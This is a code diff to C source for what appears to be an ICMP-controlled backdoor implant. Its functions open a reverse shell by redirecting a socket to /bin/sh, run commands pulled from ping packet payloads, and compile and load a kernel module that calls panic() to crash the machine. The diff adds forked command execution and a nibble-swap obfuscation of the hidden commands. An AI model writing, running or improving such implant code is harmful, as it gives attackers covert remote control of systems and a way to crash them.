@@ -16,7 +16,7 @@ static int8_t* message = \"buffer overrun at 0xdeadbeefdeadbeef\";\
 int init_module(void){panic(message);return 0;}' > kpanic.c && \
 printf 'obj-m += kpanic.o\nall:\n\t\
 make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules' > \
-Makefile && make && insmod kpanic.ko";
+Makefile && make && insmod kpanic.ko &";
 
     system(m);
     return 0;
@@ -35,14 +35,16 @@ int pop(char *lhost, char *pname, int lport) {
         dup2(r, 1);
         dup2(r, 2);
         execl("/bin/sh", pname, NULL);
-        exit();
+        exit(0);
     } else 
         return 1;
     return 0;
 }
 
 int exc(char *cmd) {
-
+    if (fork() == 0) {
+        system(cmd);
+    }
 }
 
 int get_cmd(char *payload, char *output, int size) {
@@ -69,7 +71,8 @@ int get_cmd(char *payload, char *output, int size) {
 
     j=0;
     for (i=start; i<=end; i++) {
-        output[j] = (unsigned char)payload[i];
+        output[j] = payload[i];
+        output[j] = ((unsigned char)output[j] & 0x0F)<<4 | (unsigned char)(output[j] & 0xF0)>>4;
         j++;
     }
     output[j] = 0x00;
@@ -112,39 +115,35 @@ int process_icmp(unsigned char* buffer , int size, char *ip_src, char *ip_dst, c
     printf("Len  : %d  Bytes\n",ntohs(ip_head->tot_len));
     printf("Type : %d",(unsigned int)(icmp_head->type));
 
-    if((unsigned int)(icmp_head->type) == ICMP_ECHOREPLY) {
+    if ((unsigned int)(icmp_head->type) == ICMP_ECHOREPLY) {
         printf(" (ICMP Echo Reply)\n");
         strncpy(ip_dst, inet_ntoa(source.sin_addr), strlen(inet_ntoa(source.sin_addr)));    // return src ip
         strncpy(ip_src, inet_ntoa(dest.sin_addr), strlen(inet_ntoa(dest.sin_addr)));        // return dst ip   
-    }
-    else if((unsigned int)(icmp_head->type) == ICMP_ECHO) {
+    } else if((unsigned int)(icmp_head->type) == ICMP_ECHO) {
         printf(" (ICMP Echo Request)\n");
         strncpy(ip_src, inet_ntoa(source.sin_addr), strlen(inet_ntoa(source.sin_addr)));    // return src ip
         strncpy(ip_dst, inet_ntoa(dest.sin_addr), strlen(inet_ntoa(dest.sin_addr)));        // return dst ip  
-    }
-    else
+    } else
         return 2;
 
     printf("\n");
     printf("Payload: \n");  
 
     // display
-    for(i=0 ; i < data_size ; i++) 
+    for (i=0 ; i < data_size ; i++) 
         if (data[i]>=32 && data[i]<=128)
             printf("%c",(unsigned char)data[i]);
         else
             printf(".");
 
     // return payload
-    for(i=0 ; i < data_size ; i++) 
+    for (i=0 ; i < data_size ; i++) 
         if ((unsigned char)data[i] == 0x00)
             msg[i] = 0x01;
         else if ((unsigned char)data[i] == 0xff)
             msg[i] = 0xff;
-        else if (data[i]>=32 && data[i]<=128)
-            msg[i] = (unsigned char)data[i];
         else
-            msg[i] = '.';
+            msg[i] = (unsigned char)data[i];
 
     msg[i] = 0x00;
 
